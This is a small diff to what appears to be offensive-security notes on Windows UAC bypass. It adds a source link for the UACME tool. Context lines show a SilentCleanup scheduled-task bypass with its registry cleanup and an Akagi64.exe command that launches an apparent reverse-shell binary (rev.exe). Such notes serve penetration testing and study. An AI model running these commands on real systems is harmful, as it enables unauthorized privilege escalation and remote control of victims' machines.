@@ -46,7 +46,7 @@ schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
 reg delete HKCU\Environment /v windir /f
 
 ## UACME
-Akagi64.exe, built from UACME and put in the target's upload/ folder, with a method number from its list for this build:
+Akagi64.exe, built from UACME, https://github.com/hfiref0x/UACME, which publishes no binary, and put in the target's upload/ folder, with a method number from its list for this build:
 .\Akagi64.exe THE-METHOD C:\Users\Public\rev.exe
 
 ## With a desktop
